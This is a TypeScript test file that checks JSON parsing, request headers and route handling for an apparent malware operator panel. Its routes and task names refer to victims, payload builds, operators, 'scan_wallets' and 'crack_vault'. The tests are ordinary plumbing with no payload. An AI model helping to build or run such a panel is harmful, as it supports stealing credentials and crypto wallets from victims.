import { test } from 'node:test';
import assert from 'node:assert/strict';
import Fastify from 'fastify';
import { parseJsonBody } from '../server/lib/http';
import { isTaskQueuedAck, parseResultName } from '../server/lib/discord';

test('empty JSON bodies parse as {} and invalid bodies throw', () => {
  assert.deepEqual(parseJsonBody(Buffer.from('')), {});
  assert.deepEqual(parseJsonBody('   '), {});
  assert.deepEqual(parseJsonBody('{"ok":true}'), { ok: true });
  assert.throws(() => parseJsonBody('{'));
});

test('the API client omits content-type when there is no body', async () => {
  const original = globalThis.fetch;
  const seen: Array<Headers> = [];
  globalThis.fetch = (async (_url: string | URL | Request, init?: RequestInit) => {
    seen.push(new Headers(init?.headers));
    return new Response(JSON.stringify({ ok: true }), { headers: { 'content-type': 'application/json' } });
  }) as typeof fetch;
  try {
    const { api } = await import('../src/lib/api');
    await api('/tasks/x/retry', { method: 'POST' });
    assert.equal(seen[0]!.has('content-type'), false);
    await api('/tasks', { method: 'POST', body: '{}' });
    assert.equal(seen[1]!.get('content-type'), 'application/json');
  } finally {
    globalThis.fetch = original;
  }
});

test('queued acknowledgements never close a task', () => {
  assert.equal(isTaskQueuedAck('Task scan_wallets queued'), true);
  assert.equal(isTaskQueuedAck('Task crack_vault queued\n'), true);
  assert.equal(isTaskQueuedAck('Task scan_wallets'), false);
  assert.equal(isTaskQueuedAck('wallet detected: metamask'), false);
});

test('result upload names carry the task name and id', () => {
  assert.deepEqual(parseResultName('result-crack_vault-local-123.json'), { name: 'crack_vault', id: 'local-123' });
  assert.deepEqual(parseResultName('result-scan_wallets-2f0f7f7e-1111-4222-8333-444455556666.json'), {
    name: 'scan_wallets',
    id: '2f0f7f7e-1111-4222-8333-444455556666'
  });
  assert.equal(parseResultName('wallets-1.json'), null);
});

test('every empty-body mutation accepts application/json with no payload', async () => {
  const app = Fastify();
  app.addContentTypeParser('application/json', { parseAs: 'buffer' }, (_request, body, done) => {
    try {
      done(null, parseJsonBody(body as Buffer));
    } catch {
      done(new Error('invalid JSON body'));
    }
  });
  app.setErrorHandler((error, _request, reply) => reply.code(400).send({ error: 'bad_json', message: error.message }));

  const routes: Array<[string, string, number]> = [
    ['POST', '/auth/logout', 200],
    ['POST', '/victims/00000000-0000-4000-8000-000000000001/revoke', 200],
    ['DELETE', '/victims/00000000-0000-4000-8000-000000000001', 200],
    ['POST', '/tasks/00000000-0000-4000-8000-000000000002/cancel', 200],
    ['POST', '/tasks/00000000-0000-4000-8000-000000000002/retry', 201],
    ['DELETE', '/auth/sessions/00000000-0000-4000-8000-000000000003', 200],
    ['POST', '/discord/restart', 200],
    ['POST', '/builds/00000000-0000-4000-8000-000000000004/compile', 200],
    ['POST', '/builds/00000000-0000-4000-8000-000000000004/revoke', 200],
    ['DELETE', '/builds/00000000-0000-4000-8000-000000000004', 200],
    ['DELETE', '/tasks/00000000-0000-4000-8000-000000000002', 200],
    ['POST', '/notifications/read', 200],
    ['DELETE', '/artifacts/00000000-0000-4000-8000-000000000005', 200],
    ['DELETE', '/operators/00000000-0000-4000-8000-000000000006', 200],
    ['DELETE', '/discord/ignored/123456789012345678', 200]
  ];
  for (const [method, url, status] of routes) {
    app.route({ method: method as 'POST' | 'DELETE', url, handler: (_request, reply) => reply.code(status).send({ ok: true }) });
  }

  try {
    for (const [method, url, status] of routes) {
      const response = await app.inject({ method: method as 'POST' | 'DELETE', url, headers: { 'content-type': 'application/json' }, payload: '' });
      assert.equal(response.statusCode, status, `${method} ${url} → ${response.statusCode} ${response.body}`);
    }
  } finally {
    await app.close();
  }
});
